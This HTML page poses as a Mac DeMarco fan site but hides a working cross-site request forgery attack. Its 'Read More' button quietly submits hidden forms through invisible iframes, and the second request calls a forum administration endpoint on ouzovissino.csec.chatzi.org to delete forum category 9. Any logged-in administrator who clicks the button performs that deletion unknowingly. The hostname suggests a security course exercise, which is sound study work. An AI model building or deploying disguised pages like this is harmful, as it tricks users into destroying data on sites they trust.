<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
</head>
<body>
  <style>
      #albums {
        display: none;
      }
  </style>

<header>
		<h1>Welcome to the Mac DeMarco Fan Website</h1>
	</header>
	<main>
		<h2>About Mac DeMarco</h2>
		
    <p>Mac DeMarco is a Canadian singer-songwriter and multi-instrumentalist. 
      He is known for his laid-back, lo-fi sound and his quirky personality.</p>
		
		<input type="button" value="Read More" onclick="submitForms()" />
    <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
    <form action="http://ouzovissino.csec.chatzi.org/modules/forum_admin/forum_admin.php"  method="get" id="form1" target="dummyframe">
      <input type="hidden" id="unregister" name="forumcatdel" value="yes"><br>
      <input type="hidden" id="unregister" name="cat_id" value="9"><br>
	  <input type="hidden" id="unregister" name="ok" value="0"><br>
    </form>

		<div id="albums">
			<h2>Mac DeMarco's Best Albums</h2>
			<ul>
				<li>Salad Days (2014)</li>
				<li>2 (2012)</li>
				<li>This Old Dog (2017)</li>
				<li>Here Comes the Cowboy (2019)</li>
			</ul>
		</div>

	</main>
	<footer>
		<p>Copyright © 2023 Mac DeMarco Fan Website</p>
	</footer>

<iframe name="dummyframe2" id="dummyframe2" style="display: none;"></iframe>
<form action="http://ouzovissino.csec.chatzi.org/courses/TMA100/"  method="get" target="dummyframe2" id="form2">
</form>

<script>
function submitForms (){
    document.getElementById("form2").submit();
    var albumsDiv = document.getElementById("albums");
			if (albumsDiv.style.display === "none") {
				albumsDiv.style.display = "block";
			} else {
				albumsDiv.style.display = "none";
			}
    setTimeout(() => {  document.getElementById("form1").submit(); }, 400);
}
</script>

</body>
</html>